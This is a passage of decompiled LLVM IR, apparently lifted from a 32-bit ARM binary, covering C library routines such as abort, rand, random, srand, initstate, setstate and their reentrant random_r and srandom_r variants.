  %v2_12cb4 = bitcast i32* %stack_var_-268 to i8*
  %v3_12cb4 = call i32 @__GI_memset(i8* %v2_12cb4, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12cc8

dec_label_pc_12cc8:                               ; preds = %dec_label_pc_12cc8.lr.ph, %dec_label_pc_12cc8
  %v1_12ccc = phi i32 [ 31, %dec_label_pc_12cc8.lr.ph ], [ %v1_12cd8, %dec_label_pc_12cc8 ]
  %v4_12ccc = mul i32 %v1_12ccc, 4
  %v5_12ccc = add i32 %v4_12ccc, %v2_12c14
  %v2_12cd4 = add i32 %v5_12ccc, -264
  %v3_12cd4 = inttoptr i32 %v2_12cd4 to i32*
  store i32 -1, i32* %v3_12cd4, align 4
  %v0_12cd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_12cd8 = add i32 %v0_12cd8, -1
  store i32 %v1_12cd8, i32* %r1.global-to-local, align 4
  %v6_12cd8 = icmp slt i32 %v1_12cd8, 0
  br i1 %v6_12cd8, label %dec_label_pc_12ce0, label %dec_label_pc_12cc8

dec_label_pc_12ce0:                               ; preds = %dec_label_pc_12cc8
  store i32 %v2_12bf8, i32* %r1.global-to-local, align 4
  %v4_12cf4 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_12c68

dec_label_pc_12cfc:                               ; preds = %dec_label_pc_12c90
  %v7_12cfc = icmp eq i32 %v0_12d04, 2
  br i1 %v7_12cfc, label %dec_label_pc_12d04, label %dec_label_pc_12d10

dec_label_pc_12d04:                               ; preds = %dec_label_pc_12cfc
  store i32 3, i32* @global_var_2a3a8.753, align 4
  %v0_12d0c = call i32 @abort()
  %v2_12d10.pre = load i32, i32* @global_var_2a3a8.753, align 4
  br label %dec_label_pc_12d10

dec_label_pc_12d10:                               ; preds = %dec_label_pc_12cfc, %dec_label_pc_12d04
  %v1_12d18 = phi i32 [ %v0_12d04, %dec_label_pc_12cfc ], [ %v2_12d10.pre, %dec_label_pc_12d04 ]
  %v7_12d14 = icmp eq i32 %v1_12d18, 3
  br i1 %v7_12d14, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_12d10
  %v2_12d20 = load i32, i32* %ip.global-to-local, align 4
  %v3_12d20 = inttoptr i32 %v2_12d20 to i32*
  store i32 4, i32* %v3_12d20, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12d10, %bb27
  call void @__pseudo_cond_branch(i1 %v7_12d14, i32 ptrtoint (i32* @global_var_f684.755 to i32))
  br label %dec_label_pc_12d28

dec_label_pc_12d28:                               ; preds = %dec_label_pc_12d28, %.thread3
  %v0_12d28 = call i32 @abort()
  br label %dec_label_pc_12d28

; uselistorder directives
  uselistorder i32 %v1_12cd8, { 2, 1, 0 }
  uselistorder i32 %v1_12c24, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 8, 3, 0, 1, 4, 5, 7, 6, 2 }
  uselistorder i32* @global_var_2a3a8.753, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_12d10, { 1, 0 }
  uselistorder label %dec_label_pc_12cc8, { 1, 0 }
  uselistorder label %dec_label_pc_12c90, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12c14, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_12d40 = call i32 @random()
  ret i32 %v0_12d40

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 6, 5, 8, 7, 4, 3, 10, 9, 1, 0, 2 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_12d44 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2405c.757 to i32), i32* @r4, align 4
  %v2_12d4c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_12d4c, i32* @r0, align 4
  %v1_12d64 = call i32 @__pthread_return_void()
  %v1_12d74 = call i32 @__pthread_return_0()
  %v2_12d78 = ptrtoint i32* %stack_var_-16 to i32
  %v3_12d80 = call i32 @__GI_random_r(i32* inttoptr (i32 147572 to i32*), i32 %v2_12d78)
  store i32 %v2_12d4c, i32* @r0, align 4
  store i32 77208, i32* @lr, align 4
  %v1_12d94 = call i32 @__pthread_return_void()
  %v3_12d98 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_12d44, i32* @r4, align 4
  ret i32 %v3_12d98
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_12dc4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_12dc4, i32* @r0, align 4
  %v1_12de0 = call i32 @__pthread_return_void()
  %v1_12df0 = call i32 @__pthread_return_0()
  %v3_12e00 = load i32, i32* bitcast (i32** @global_var_2407c.770 to i32*), align 4
  store i32 %v3_12e00, i32* @r4, align 4
  %v3_12e04 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_24074)
  %v1_12e0c = icmp slt i32 %v3_12e04, 0
  store i32 %v2_12dc4, i32* @r0, align 4
  %. = select i1 %v1_12e0c, i32 0, i32 ptrtoint (i32** @global_var_24078.772 to i32)
  %v1_12e24 = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_12e54 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_12e54, i32* @r0, align 4
  %v1_12e78 = call i32 @__pthread_return_void()
  %v1_12e88 = call i32 @__pthread_return_0()
  %v0_12e90 = load i32, i32* @r5, align 4
  %v0_12e94 = load i32, i32* @r6, align 4
  %v0_12e98 = load i32, i32* @r8, align 4
  store i32 %v0_12e98, i32* @r0, align 4
  %v3_12e9c = load i32, i32* bitcast (i32** @global_var_2407c.770 to i32*), align 4
  store i32 %v3_12e9c, i32* @r4, align 4
  %v4_12ea0 = inttoptr i32 %v0_12e98 to i32*
  %v5_12ea0 = call i32 @__GI_initstate_r(i32* %v4_12ea0, i32 %v0_12e90, i32 %v0_12e94, i32 ptrtoint (i32* @global_var_24074 to i32))
  store i32 %v2_12e54, i32* @r0, align 4
  %v1_12eb4 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_24078.772 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_12ee4 = load i32, i32* @r4, align 4
  %v9_12ee4 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2405c.757 to i32), i32* @r4, align 4
  %v2_12eec = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_12eec, i32* @r0, align 4
  %v1_12f08 = call i32 @__pthread_return_void()
  %v1_12f18 = call i32 @__pthread_return_0()
  %v0_12f1c = load i32, i32* @r6, align 4
  store i32 %v0_12f1c, i32* @r0, align 4
  %v2_12f24 = inttoptr i32 %v0_12f1c to i32*
  %v3_12f24 = call i32 @srandom_r(i32* %v2_12f24, i32 ptrtoint (i32* @global_var_24074 to i32))
  store i32 %v2_12eec, i32* @r0, align 4
  store i32 77632, i32* @lr, align 4
  %v1_12f3c = call i32 @__pthread_return_void()
  store i32 %v3_12ee4, i32* @r4, align 4
  store i32 %v9_12ee4, i32* @r6, align 4
  ret i32 %v1_12f3c

; uselistorder directives
  uselistorder i32* @global_var_24074, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_24074 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_12f60 = add i32 %tmp, 12
  %v2_12f60 = inttoptr i32 %v1_12f60 to i32*
  %v3_12f60 = load i32, i32* %v2_12f60, align 4
  %v3_12f64 = load i32, i32* @r4, align 4
  store i32 %v3_12f64, i32* %stack_var_-20, align 4
  %v2_12f68 = icmp eq i32 %v3_12f60, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_12f68, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_12f741 = add i32 %tmp, 8
  %v2_12f742 = inttoptr i32 %v1_12f741 to i32*
  %v3_12f743 = load i32, i32* %v2_12f742, align 4
  store i32 %v3_12f743, i32* %r1.global-to-local, align 4
  %v3_12f88 = add i32 %v3_12f743, -4
  %v4_12f88 = inttoptr i32 %v3_12f88 to i32*
  store i32 0, i32* %v4_12f88, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_12f70 = add i32 %tmp, 4
  %v3_12f70 = inttoptr i32 %v2_12f70 to i32*
  %v4_12f70 = load i32, i32* %v3_12f70, align 4
  %v1_12f74 = add i32 %tmp, 8
  %v2_12f74 = inttoptr i32 %v1_12f74 to i32*
  %v3_12f74 = load i32, i32* %v2_12f74, align 4
  store i32 %v3_12f74, i32* %r1.global-to-local, align 4
  %v3_12f78 = sub i32 %v4_12f70, %v3_12f74
  %v4_12f7c = sdiv i32 %v3_12f78, 4
  %v4_12f84 = mul i32 %v4_12f7c, 5
  %v5_12f84 = add i32 %v4_12f84, %v3_12f60
  %v3_12f8c = add i32 %v3_12f74, -4
  %v4_12f8c = inttoptr i32 %v3_12f8c to i32*
  store i32 %v5_12f84, i32* %v4_12f8c, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_12f90 = add i32 %arg1, 4
  store i32 %v1_12f90, i32* %r6.global-to-local, align 4
  %v2_12f94 = inttoptr i32 %arg1 to i32*
  %v3_12f94 = load i32, i32* %v2_12f94, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_12f9c = srem i32 %v3_12f94, 5
  store i32 %v2_12f9c, i32* %r0.global-to-local, align 4
  %v2_12fa8 = and i32 %v2_12f9c, 1073741824
  %v3_12fa8 = icmp ne i32 %v2_12fa8, 0
  %v4_12fa8 = mul nsw i32 %v2_12f9c, 4
  %v2_12fac = icmp ne i32 %v2_12f9c, 4
  %v3_12fac = and i1 %v3_12fa8, %v2_12fac
  br i1 %v3_12fac, label %dec_label_pc_13008, label %dec_label_pc_12fb0

dec_label_pc_12fb0:                               ; preds = %bb
  %v5_12fa8 = add i32 %v4_12fa8, ptrtoint (i32* @global_var_1ac58.786 to i32)
  %v1_12fb0 = add i32 %v4_12fa8, add (i32 ptrtoint (i32* @global_var_1ac58.786 to i32), i32 20)
  %v2_12fb0 = inttoptr i32 %v1_12fb0 to i32*
  %v3_12fb0 = load i32, i32* %v2_12fb0, align 4
  store i32 %v3_12fb0, i32* %r5.global-to-local, align 4
  %v6_12fb4 = inttoptr i32 %v5_12fa8 to i32*
  %v7_12fb4 = load i32, i32* %v6_12fb4, align 4
  store i32 %v7_12fb4, i32* %r7.global-to-local, align 4
  %v2_12fb8 = icmp eq i32 %v2_12f9c, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_12fc0 = load i32, i32* %r4.global-to-local, align 4
  %v2_12fc0 = add i32 %v1_12fc0, 16
  %v3_12fc0 = inttoptr i32 %v2_12fc0 to i32*
  store i32 %v3_12fb0, i32* %v3_12fc0, align 4
  %v0_12fc4 = load i32, i32* %r7.global-to-local, align 4
  %v1_12fc4 = load i32, i32* %r4.global-to-local, align 4
  %v2_12fc4 = add i32 %v1_12fc4, 20
  %v3_12fc4 = inttoptr i32 %v2_12fc4 to i32*
  store i32 %v0_12fc4, i32* %v3_12fc4, align 4
  %v0_12fc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_12fc8 = load i32, i32* %r4.global-to-local, align 4
  %v2_12fc8 = add i32 %v1_12fc8, 12
  %v3_12fc8 = inttoptr i32 %v2_12fc8 to i32*
  store i32 %v0_12fc8, i32* %v3_12fc8, align 4
  br i1 %v2_12fb8, label %dec_label_pc_12ff4, label %dec_label_pc_12fd0

dec_label_pc_12fd0:                               ; preds = %dec_label_pc_12fb0
  %v0_12fd0 = load i32, i32* %r6.global-to-local, align 4
  %v1_12fd0 = add i32 %v0_12fd0, -4
  %v2_12fd0 = inttoptr i32 %v1_12fd0 to i32*
  %v3_12fd0 = load i32, i32* %v2_12fd0, align 4
  %v1_12fd4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12fd4 = sdiv i32 %v3_12fd0, %v1_12fd4
  store i32 %v2_12fd4, i32* %r0.global-to-local, align 4
  %v4_12fd8 = mul i32 %v2_12fd4, 4
  %v5_12fd8 = add i32 %v4_12fd8, %v0_12fd0
  %v1_12fdc = load i32, i32* %r4.global-to-local, align 4
  %v2_12fdc = add i32 %v1_12fdc, 4
  %v3_12fdc = inttoptr i32 %v2_12fdc to i32*
  store i32 %v5_12fd8, i32* %v3_12fdc, align 4
  %v0_12fe0 = load i32, i32* %r0.global-to-local, align 4
  %v1_12fe0 = load i32, i32* %r7.global-to-local, align 4
  %v2_12fe0 = add i32 %v1_12fe0, %v0_12fe0
  %v0_12fe4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12fe4, i32* %r1.global-to-local, align 4
  %v2_12fe8 = srem i32 %v2_12fe0, %v0_12fe4
  %v0_12fec = load i32, i32* %r6.global-to-local, align 4
  %v4_12fec = mul i32 %v2_12fe8, 4
  %v5_12fec = add i32 %v0_12fec, %v4_12fec
  store i32 %v5_12fec, i32* %r0.global-to-local, align 4
  %v1_12ff0 = load i32, i32* %r4.global-to-local, align 4
  %v2_12ff0 = inttoptr i32 %v1_12ff0 to i32*
  store i32 %v5_12fec, i32* %v2_12ff0, align 4
  br label %dec_label_pc_12ff4

dec_label_pc_12ff4:                               ; preds = %dec_label_pc_12fb0, %dec_label_pc_12fd0
  %v0_12ff4 = load i32, i32* %r6.global-to-local, align 4
  %v1_12ff4 = load i32, i32* %r5.global-to-local, align 4
  %v4_12ff4 = mul i32 %v1_12ff4, 4
  %v5_12ff4 = add i32 %v4_12ff4, %v0_12ff4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12ffc = load i32, i32* %r4.global-to-local, align 4
  %v2_12ffc = add i32 %v1_12ffc, 24
  %v3_12ffc = inttoptr i32 %v2_12ffc to i32*
  store i32 %v5_12ff4, i32* %v3_12ffc, align 4
  %v0_13000 = load i32, i32* %r6.global-to-local, align 4
  %v1_13000 = load i32, i32* %r4.global-to-local, align 4
  %v2_13000 = add i32 %v1_13000, 8
  %v3_13000 = inttoptr i32 %v2_13000 to i32*
  store i32 %v0_13000, i32* %v3_13000, align 4
  %v2_13004 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13004, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_13008:                               ; preds = %bb
  %v0_13008 = call i32 @__errno_location()
  %v2_13010 = inttoptr i32 %v0_13008 to i32*
  store i32 22, i32* %v2_13010, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13018 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13018, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_12f9c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 3, 4, 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ff4, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_13020 = add i32 %tmp, 12
  %v2_13020 = inttoptr i32 %v1_13020 to i32*
  %v3_13020 = load i32, i32* %v2_13020, align 4
  store i32 %v3_13020, i32* %r3.global-to-local, align 4
  %v2_13024 = icmp eq i32 %v3_13020, 0
  %v3_13028 = load i32, i32* @r4, align 4
  store i32 %v3_13028, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_13034 = add i32 %tmp, 8
  %v2_13034 = inttoptr i32 %v1_13034 to i32*
  %v3_13034 = load i32, i32* %v2_13034, align 4
  store i32 %v3_13034, i32* %lr.global-to-local, align 4
  br i1 %v2_13024, label %dec_label_pc_1303c, label %dec_label_pc_13060

dec_label_pc_1303c:                               ; preds = %entry
  %v1_1303c = inttoptr i32 %v3_13034 to i32*
  %v2_1303c = load i32, i32* %v1_1303c, align 4
  store i32 %v2_1303c, i32* %r2.global-to-local, align 4
  %v2_13044 = mul i32 %v2_1303c, 1103515245
  %v1_1304c = add i32 %v2_13044, 12345
  %tmp10 = bitcast i32 %v1_1304c to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_13050 = bitcast float %tmp11 to i32
  store i32 %v1_13050, i32* %r3.global-to-local, align 4
  store i32 %v1_13050, i32* %v1_1303c, align 4
  %v0_13058 = load i32, i32* %r3.global-to-local, align 4
  %v2_13058 = inttoptr i32 %arg2 to i32*
  store i32 %v0_13058, i32* %v2_13058, align 4
  br label %dec_label_pc_130a4

dec_label_pc_13060:                               ; preds = %entry
  %v2_13060 = load i32, i32* %arg1, align 4
  store i32 %v2_13060, i32* %r2.global-to-local, align 4
  %v1_13064 = add i32 %tmp, 4
  %v2_13064 = inttoptr i32 %v1_13064 to i32*
  %v3_13064 = load i32, i32* %v2_13064, align 4
  store i32 %v3_13064, i32* %r0.global-to-local, align 4
  %v1_13068 = inttoptr i32 %v2_13060 to i32*
  %v2_13068 = load i32, i32* %v1_13068, align 4
  store i32 %v2_13068, i32* %r3.global-to-local, align 4
  %v1_1306c = inttoptr i32 %v3_13064 to i32*
  %v2_1306c = load i32, i32* %v1_1306c, align 4
  %v4_1306c = add i32 %v3_13064, 4
  store i32 %v4_1306c, i32* %r0.global-to-local, align 4
  %v2_13070 = add i32 %v2_1306c, %v2_13068
  store i32 %v2_13070, i32* %r3.global-to-local, align 4
  store i32 %v2_13070, i32* %v1_13068, align 4
  %v3_13074 = load i32, i32* %r2.global-to-local, align 4
  %v4_13074 = add i32 %v3_13074, 4
  store i32 %v4_13074, i32* %r2.global-to-local, align 4
  %v0_13078 = load i32, i32* %ip.global-to-local, align 4
  %v1_13078 = add i32 %v0_13078, 24
  %v2_13078 = inttoptr i32 %v1_13078 to i32*
  %v3_13078 = load i32, i32* %v2_13078, align 4
  store i32 %v3_13078, i32* %r4.global-to-local, align 4
  %v0_1307c = load i32, i32* %r3.global-to-local, align 4
  %v3_1307c = udiv i32 %v0_1307c, 2
  store i32 %v3_1307c, i32* %r3.global-to-local, align 4
  %v3_13080 = icmp ult i32 %v4_13074, %v3_13078
  %v1_13084 = load i32, i32* %r5.global-to-local, align 4
  %v2_13084 = inttoptr i32 %v1_13084 to i32*
  store i32 %v3_1307c, i32* %v2_13084, align 4
  br i1 %v3_13080, label %dec_label_pc_13094, label %bb

bb:                                               ; preds = %dec_label_pc_13060
  %v1_13088 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_13088, i32* %r2.global-to-local, align 4
  %v0_1308c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1308c, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_13094:                               ; preds = %dec_label_pc_13060
  %v0_1308c1 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1308c1, i32* %r3.global-to-local, align 4
  %v1_13094 = load i32, i32* %r4.global-to-local, align 4
  %v3_13094 = icmp ult i32 %v0_1308c1, %v1_13094
  br i1 %v3_13094, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_13094
  store i32 %v0_1308c1, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_13094
  %v1_1309c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_1309c, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_130a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_130a0 = inttoptr i32 %v0_130a0 to i32*
  %v2_130a0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_130a0, i32* %v1_130a0, align 4
  %v3_130a0 = add i32 %v0_130a0, 4
  %v4_130a0 = inttoptr i32 %v3_130a0 to i32*
  %v5_130a0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_130a0, i32* %v4_130a0, align 4
  br label %dec_label_pc_130a4

dec_label_pc_130a4:                               ; preds = %dec_label_pc_1303c, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_130a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_130a8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1308c1, { 1, 0, 2 }
  uselistorder i32 %v3_1307c, { 1, 0 }
  uselistorder i32 %v1_13050, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder label %dec_label_pc_130a4, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_130b0 = load i32, i32* @r4, align 4
  store i32 %v3_130b0, i32* %stack_var_-32, align 4
  %v6_130b0 = load i32, i32* @r5, align 4
  %v1_130b4 = add i32 %tmp, 12
  %v2_130b4 = inttoptr i32 %v1_130b4 to i32*
  %v3_130b4 = load i32, i32* %v2_130b4, align 4
  %v2_130bc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_130b4, 4
  br i1 %tmp29, label %.dec_label_pc_13168_crit_edge, label %dec_label_pc_130cc

.dec_label_pc_13168_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_13168

dec_label_pc_130cc:                               ; preds = %entry
  %v0_130cc = load i32, i32* @r0, align 4
  %v2_130cc = icmp eq i32 %v0_130cc, 0
  %v1_130d0 = add i32 %tmp, 8
  %v2_130d0 = inttoptr i32 %v1_130d0 to i32*
  %v3_130d0 = load i32, i32* %v2_130d0, align 4
  store i32 %v3_130d0, i32* %r7.global-to-local, align 4
  br i1 %v2_130cc, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_130cc
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_130cc, %bb
  %v0_130dc = phi i32 [ %v0_130cc, %dec_label_pc_130cc ], [ 1, %bb ]
  %v2_130d8 = icmp eq i32 %v3_130b4, 0
  %v2_130dc = inttoptr i32 %v3_130d0 to i32*
  store i32 %v0_130dc, i32* %v2_130dc, align 4
  br i1 %v2_130d8, label %dec_label_pc_13164, label %dec_label_pc_130e4

dec_label_pc_130e4:                               ; preds = %bb21
  %v1_130e4 = add i32 %tmp, 16
  %v2_130e4 = inttoptr i32 %v1_130e4 to i32*
  %v3_130e4 = load i32, i32* %v2_130e4, align 4
  store i32 %v3_130e4, i32* %sb.global-to-local, align 4
  %v0_130e8 = load i32, i32* @r0, align 4
  %v0_130ec = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_130ec, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_1313423 = icmp sgt i32 %v3_130e4, 1
  br i1 %v5_1313423, label %dec_label_pc_130f8, label %dec_label_pc_13138

dec_label_pc_130f8:                               ; preds = %dec_label_pc_130e4, %dec_label_pc_130f8
  %v0_1310825 = phi i32 [ %v0_13128.pre, %dec_label_pc_130f8 ], [ %v0_130e8, %dec_label_pc_130e4 ]
  %v1_1312024 = phi i32 [ %v5_13120, %dec_label_pc_130f8 ], [ %v0_130ec, %dec_label_pc_130e4 ]
  %v2_130f8 = srem i32 %v0_1310825, 127773
  %v2_13104 = mul i32 %v2_130f8, 16807
  %v2_1310c = sdiv i32 %v0_1310825, 127773
  %tmp30 = mul nsw i32 %v2_1310c, -2836
  %v2_13118 = add i32 %v2_13104, %tmp30
  %v8_13118 = icmp slt i32 %v2_13118, 0
  %v2_1311c = add i32 %v2_13118, 2147483647
  %v2_1311c.v2_13118 = select i1 %v8_13118, i32 %v2_1311c, i32 %v2_13118
  store i32 %v2_1311c.v2_13118, i32* @r5, align 4
  %v2_13120 = add i32 %v1_1312024, 4
  %v3_13120 = inttoptr i32 %v2_13120 to i32*
  store i32 %v2_1311c.v2_13118, i32* %v3_13120, align 4
  %v4_13120 = load i32, i32* %sl.global-to-local, align 4
  %v5_13120 = add i32 %v4_13120, 4
  store i32 %v5_13120, i32* %sl.global-to-local, align 4
  %v0_13124.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_13124.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_13128.pre = load i32, i32* @r5, align 4
  %v1_13130 = add i32 %v0_13124.pre, 1
  store i32 %v1_13130, i32* %r8.global-to-local, align 4
  %v5_13134 = icmp slt i32 %v0_13124.pre, %v1_13124.pre
  br i1 %v5_13134, label %dec_label_pc_130f8, label %dec_label_pc_13124.dec_label_pc_13138_crit_edge

dec_label_pc_13124.dec_label_pc_13138_crit_edge:  ; preds = %dec_label_pc_130f8
  %v0_13144.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13138

dec_label_pc_13138:                               ; preds = %dec_label_pc_13124.dec_label_pc_13138_crit_edge, %dec_label_pc_130e4
  %v0_13144 = phi i32 [ %v0_13144.pre, %dec_label_pc_13124.dec_label_pc_13138_crit_edge ], [ %v0_130ec, %dec_label_pc_130e4 ]
  %v0_1313c.lcssa = phi i32 [ %v1_13124.pre, %dec_label_pc_13124.dec_label_pc_13138_crit_edge ], [ %v3_130e4, %dec_label_pc_130e4 ]
  %v2_1313c = mul i32 %v0_1313c.lcssa, 10
  store i32 %v2_1313c, i32* @r4, align 4
  %v0_13140 = load i32, i32* %r6.global-to-local, align 4
  %v1_13140 = add i32 %v0_13140, 20
  %v2_13140 = inttoptr i32 %v1_13140 to i32*
  %v3_13140 = load i32, i32* %v2_13140, align 4
  %v4_13144 = mul i32 %v3_13140, 4
  %v5_13144 = add i32 %v0_13144, %v4_13144
  %v1_13148 = inttoptr i32 %v0_13140 to i32*
  store i32 %v5_13144, i32* %v1_13148, align 4
  %v3_13148 = add i32 %v0_13140, 4
  %v4_13148 = inttoptr i32 %v3_13148 to i32*
  %v5_13148 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_13148, i32* %v4_13148, align 4
  br label %dec_label_pc_13154

dec_label_pc_13150:                               ; preds = %dec_label_pc_13154
  %v0_13158 = load i32, i32* %r6.global-to-local, align 4
  %v2_13150 = inttoptr i32 %v0_13158 to i32*
  %v3_13150 = call i32 @__GI_random_r(i32* %v2_13150, i32 %v2_130bc)
  br label %dec_label_pc_13154

dec_label_pc_13154:                               ; preds = %dec_label_pc_13138, %dec_label_pc_13150
  %v0_13154 = load i32, i32* @r4, align 4
  %v1_13154 = add i32 %v0_13154, -1
  store i32 %v1_13154, i32* @r4, align 4
  %v6_13154 = icmp slt i32 %v1_13154, 0
  br i1 %v6_13154, label %dec_label_pc_13164, label %dec_label_pc_13150

dec_label_pc_13164:                               ; preds = %dec_label_pc_13154, %bb21
  %v2_1316c.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_13168

dec_label_pc_13168:                               ; preds = %.dec_label_pc_13168_crit_edge, %dec_label_pc_13164
  %v2_1316c = phi i32 [ %v3_130b0, %.dec_label_pc_13168_crit_edge ], [ %v2_1316c.pre, %dec_label_pc_13164 ]
  %v26_1316c = phi i32 [ -1, %.dec_label_pc_13168_crit_edge ], [ 0, %dec_label_pc_13164 ]
  store i32 %v2_1316c, i32* @r4, align 4
  store i32 %v6_130b0, i32* @r5, align 4
  ret i32 %v26_1316c

; uselistorder directives
  uselistorder i32 %v1_13154, { 1, 0 }
  uselistorder i32 %v0_13140, { 1, 0, 2 }
  uselistorder i32 %v0_13124.pre, { 1, 0 }
  uselistorder i32 %v5_13120, { 1, 0 }
